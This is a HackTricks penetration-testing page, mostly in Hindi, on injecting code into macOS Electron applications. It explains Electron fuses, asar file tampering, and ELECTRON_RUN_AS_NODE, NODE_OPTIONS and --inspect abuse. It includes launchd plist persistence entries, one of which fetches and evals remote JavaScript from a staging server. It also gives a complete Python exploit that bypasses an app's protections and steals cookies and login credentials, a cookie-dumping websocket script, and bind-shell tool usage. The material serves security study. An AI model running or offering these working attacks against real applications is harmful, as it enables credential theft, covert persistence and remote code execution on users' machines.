# macOS Electron Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Basic Information

यदि आप नहीं जानते कि Electron क्या है, तो आप [**यहां बहुत सारी जानकारी पा सकते हैं**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation)। लेकिन अभी के लिए बस इतना जान लें कि Electron **node** चलाता है।\
और node के कुछ **parameters** और **env variables** हैं जिन्हें **अन्य कोड निष्पादित करने** के लिए उपयोग किया जा सकता है, जो निर्दिष्ट फ़ाइल के अलावा हैं।

### Electron Fuses

इन तकनीकों पर अगली चर्चा की जाएगी, लेकिन हाल के समय में Electron ने कई **सुरक्षा ध्वज जोड़े हैं** ताकि उन्हें रोका जा सके। ये हैं [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) और ये वे हैं जो macOS में Electron ऐप्स को **मनमाने कोड लोड करने** से **रोकने** के लिए उपयोग किए जाते हैं:

- **`RunAsNode`**: यदि अक्षम किया गया, तो यह कोड इंजेक्ट करने के लिए env var **`ELECTRON_RUN_AS_NODE`** के उपयोग को रोकता है।
- **`EnableNodeCliInspectArguments`**: यदि अक्षम किया गया, तो `--inspect`, `--inspect-brk` जैसे params का सम्मान नहीं किया जाएगा। इस तरह कोड इंजेक्ट करने से बचना।
- **`EnableEmbeddedAsarIntegrityValidation`**: यदि सक्षम किया गया, तो लोड किया गया **`asar`** **file** macOS द्वारा **मान्य** किया जाएगा। इस तरह **कोड इंजेक्शन** को इस फ़ाइल की सामग्री को संशोधित करके रोकना।
- **`OnlyLoadAppFromAsar`**: यदि यह सक्षम है, तो यह निम्नलिखित क्रम में लोड करने के लिए खोजने के बजाय: **`app.asar`**, **`app`** और अंततः **`default_app.asar`**। यह केवल app.asar की जांच करेगा और इसका उपयोग करेगा, इस प्रकार यह सुनिश्चित करेगा कि जब **`embeddedAsarIntegrityValidation`** फ्यूज़ के साथ **संयुक्त** किया जाता है, तो **अमान्य कोड लोड करना** **असंभव** है।
- **`LoadBrowserProcessSpecificV8Snapshot`**: यदि सक्षम किया गया, तो ब्राउज़र प्रक्रिया अपने V8 स्नैपशॉट के लिए `browser_v8_context_snapshot.bin` नामक फ़ाइल का उपयोग करती है।

एक और दिलचस्प फ्यूज़ जो कोड इंजेक्शन को रोकने वाला नहीं है:

- **EnableCookieEncryption**: यदि सक्षम किया गया, तो डिस्क पर कुकी स्टोर को OS स्तर की क्रिप्टोग्राफी कुंजियों का उपयोग करके एन्क्रिप्ट किया जाता है।

### Checking Electron Fuses

आप एक एप्लिकेशन से **इन ध्वजों की जांच** कर सकते हैं:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Electron Fuses को संशोधित करना

जैसा कि [**docs में उल्लेख किया गया है**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), **Electron Fuses** की कॉन्फ़िगरेशन **Electron binary** के अंदर होती है जिसमें कहीं **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** स्ट्रिंग होती है।

macOS अनुप्रयोगों में यह आमतौर पर `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework` में होता है।
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
आप इस फ़ाइल को [https://hexed.it/](https://hexed.it/) में लोड कर सकते हैं और पिछले स्ट्रिंग के लिए खोज कर सकते हैं। इस स्ट्रिंग के बाद आप ASCII में "0" या "1" संख्या देख सकते हैं जो यह दर्शाती है कि प्रत्येक फ्यूज़ अक्षम या सक्षम है। बस हेक्स कोड (`0x30` का अर्थ `0` और `0x31` का अर्थ `1`) को **फ्यूज़ मानों को संशोधित** करने के लिए बदलें।

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि यदि आप इन बाइट्स को संशोधित करके **`Electron Framework`** बाइनरी को किसी एप्लिकेशन के अंदर **ओवरराइट** करने की कोशिश करते हैं, तो ऐप नहीं चलेगा।

## RCE कोड जोड़ना Electron एप्लिकेशनों में

ऐसे **बाहरी JS/HTML फ़ाइलें** हो सकती हैं जिनका उपयोग एक Electron ऐप कर रहा है, इसलिए एक हमलावर इन फ़ाइलों में कोड इंजेक्ट कर सकता है जिनका हस्ताक्षर नहीं चेक किया जाएगा और ऐप के संदर्भ में मनमाना कोड निष्पादित कर सकता है।

> [!CAUTION]
> हालाँकि, वर्तमान में 2 सीमाएँ हैं:
>
> - एक ऐप को संशोधित करने के लिए **`kTCCServiceSystemPolicyAppBundles`** अनुमति **आवश्यक** है, इसलिए डिफ़ॉल्ट रूप से यह अब संभव नहीं है।
> - संकलित **`asap`** फ़ाइल में आमतौर पर फ्यूज़ **`embeddedAsarIntegrityValidation`** `और` **`onlyLoadAppFromAsar`** `सक्षम` होते हैं
>
> इस हमले के रास्ते को और अधिक जटिल (या असंभव) बना रहा है।

ध्यान दें कि **`kTCCServiceSystemPolicyAppBundles`** की आवश्यकता को बायपास करना संभव है, एप्लिकेशन को किसी अन्य निर्देशिका (जैसे **`/tmp`**) में कॉपी करके, फ़ोल्डर का नाम **`app.app/Contents`** से **`app.app/NotCon`** में बदलकर, अपने **दुष्ट** कोड के साथ **asar** फ़ाइल को **संशोधित** करके, इसे फिर से **`app.app/Contents`** नाम देकर और इसे निष्पादित करके।

आप asar फ़ाइल से कोड को निकालने के लिए:
```bash
npx asar extract app.asar app-decomp
```
और इसे संशोधित करने के बाद फिर से पैक करें:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE with ELECTRON_RUN_AS_NODE

According to [**the docs**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), यदि यह env वेरिएबल सेट किया गया है, तो यह प्रक्रिया को एक सामान्य Node.js प्रक्रिया के रूप में शुरू करेगा।
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> यदि फ्यूज़ **`RunAsNode`** अक्षम है, तो env var **`ELECTRON_RUN_AS_NODE`** को अनदेखा किया जाएगा, और यह काम नहीं करेगा।

### ऐप प्लिस्ट से इंजेक्शन

जैसा कि [**यहां प्रस्तावित किया गया है**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), आप इस env वेरिएबल का दुरुपयोग एक plist में स्थिरता बनाए रखने के लिए कर सकते हैं:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE with `NODE_OPTIONS`

आप पेलोड को एक अलग फ़ाइल में स्टोर कर सकते हैं और इसे निष्पादित कर सकते हैं:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> यदि फ्यूज़ **`EnableNodeOptionsEnvironmentVariable`** **अक्षम** है, तो ऐप **NODE_OPTIONS** पर्यावरण चर को **अनदेखा** करेगा जब इसे लॉन्च किया जाएगा, जब तक कि पर्यावरण चर **`ELECTRON_RUN_AS_NODE`** सेट न किया गया हो, जिसे फ्यूज़ **`RunAsNode`** अक्षम होने पर भी **अनदेखा** किया जाएगा।
>
> यदि आप **`ELECTRON_RUN_AS_NODE`** सेट नहीं करते हैं, तो आपको **त्रुटि** मिलेगी: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### ऐप plist से इंजेक्शन

आप इन कुंजियों को जोड़कर स्थिरता बनाए रखने के लिए plist में इस पर्यावरण चर का दुरुपयोग कर सकते हैं:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE with inspecting

According to [**this**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), यदि आप **`--inspect`**, **`--inspect-brk`** और **`--remote-debugging-port`** जैसे फ्लैग के साथ एक Electron एप्लिकेशन चलाते हैं, तो एक **debug port खुला होगा** ताकि आप इससे कनेक्ट कर सकें (उदाहरण के लिए Chrome में `chrome://inspect`) और आप **इस पर कोड इंजेक्ट** कर सकेंगे या यहां तक कि नए प्रोसेस भी लॉन्च कर सकेंगे।\
उदाहरण के लिए:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
In [**इस ब्लॉगपोस्ट**](https://hackerone.com/reports/1274695), इस डिबगिंग का दुरुपयोग किया गया है ताकि एक हेडलेस क्रोम **मनमाने फ़ाइलों को मनमाने स्थानों पर डाउनलोड** कर सके।

> [!TIP]
> यदि किसी ऐप का अपना तरीका है यह जांचने के लिए कि क्या env वेरिएबल या पैरामीटर्स जैसे `--inspect` सेट हैं, तो आप रनटाइम में `--inspect-brk` आर्ग का उपयोग करके इसे **बायपास** करने की कोशिश कर सकते हैं, जो ऐप के शुरू में **निष्पादन को रोक देगा** और एक बायपास को निष्पादित करेगा (उदाहरण के लिए, वर्तमान प्रक्रिया के आर्ग्स या env वेरिएबल्स को ओवरराइट करना)।

निम्नलिखित एक एक्सप्लॉइट था जिसमें ऐप को `--inspect-brk` पैरामीटर के साथ मॉनिटर और निष्पादित करके कस्टम सुरक्षा को बायपास करना संभव था (प्रक्रिया के पैरामीटर्स को `--inspect-brk` को हटाने के लिए ओवरराइट करना) और फिर ऐप से कुकीज़ और क्रेडेंशियल्स को डंप करने के लिए एक JS पेलोड इंजेक्ट करना:
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> यदि फ्यूज़ **`EnableNodeCliInspectArguments`** बंद है, तो ऐप **नोड पैरामीटर** (जैसे `--inspect`) को लॉन्च करते समय **अनदेखा** करेगा जब तक कि एन्वायरनमेंट वेरिएबल **`ELECTRON_RUN_AS_NODE`** सेट न हो, जिसे फ्यूज़ **`RunAsNode`** बंद होने पर भी **अनदेखा** किया जाएगा।
>
> हालाँकि, आप अभी भी **इलेक्ट्रॉन पैरामीटर `--remote-debugging-port=9229`** का उपयोग कर सकते हैं लेकिन पिछले पेलोड अन्य प्रक्रियाओं को निष्पादित करने के लिए काम नहीं करेगा।

पैरामीटर **`--remote-debugging-port=9222`** का उपयोग करके इलेक्ट्रॉन ऐप से कुछ जानकारी चुराना संभव है जैसे **इतिहास** (GET कमांड के साथ) या ब्राउज़र के **कुकीज़** (क्योंकि वे ब्राउज़र के अंदर **डिक्रिप्ट** होते हैं और एक **json एंडपॉइंट** है जो उन्हें देगा)।

आप यह कैसे करना है [**यहाँ**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) और [**यहाँ**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) सीख सकते हैं और स्वचालित उपकरण [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) या एक साधारण स्क्रिप्ट का उपयोग कर सकते हैं:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### Injection from the App Plist

आप इस env वेरिएबल का दुरुपयोग एक plist में स्थिरता बनाए रखने के लिए इन कुंजियों को जोड़कर कर सकते हैं:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass पुराने संस्करणों का दुरुपयोग

> [!TIP]
> macOS का TCC डेमन एप्लिकेशन के निष्पादित संस्करण की जांच नहीं करता है। इसलिए यदि आप **Electron एप्लिकेशन में कोड इंजेक्ट नहीं कर सकते** किसी भी पिछले तकनीकों के साथ, तो आप APP का एक पिछला संस्करण डाउनलोड कर सकते हैं और उस पर कोड इंजेक्ट कर सकते हैं क्योंकि इसे अभी भी TCC विशेषाधिकार मिलेंगे (जब तक कि Trust Cache इसे रोक न दे)।

## गैर-JS कोड चलाना

पिछली तकनीकें आपको **Electron एप्लिकेशन की प्रक्रिया के अंदर JS कोड चलाने** की अनुमति देंगी। हालाँकि, याद रखें कि **बच्चे की प्रक्रियाएँ माता-पिता के एप्लिकेशन के समान सैंडबॉक्स प्रोफ़ाइल के तहत चलती हैं** और **उनकी TCC अनुमतियाँ विरासत में लेती हैं**।\
इसलिए, यदि आप कैमरा या माइक्रोफ़ोन तक पहुँचने के लिए विशेषाधिकारों का दुरुपयोग करना चाहते हैं, तो आप बस **प्रक्रिया से एक और बाइनरी चला सकते हैं**।

## स्वचालित इंजेक्शन

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

उपकरण [**electroniz3r**](https://github.com/r3ggi/electroniz3r) का उपयोग करना आसान है **संवेदनशील Electron एप्लिकेशन** खोजने और उन पर कोड इंजेक्ट करने के लिए। यह उपकरण **`--inspect`** तकनीक का उपयोग करने की कोशिश करेगा:

आपको इसे स्वयं संकलित करना होगा और आप इसे इस तरह उपयोग कर सकते हैं:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki को Electron अनुप्रयोगों में बैकडोर करने के लिए डिज़ाइन किया गया था, जो अनुप्रयोगों की JavaScript फ़ाइलों को Loki Command & Control JavaScript फ़ाइलों से बदलता है।

## References

- [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{{#include ../../../banners/hacktricks-training.md}}
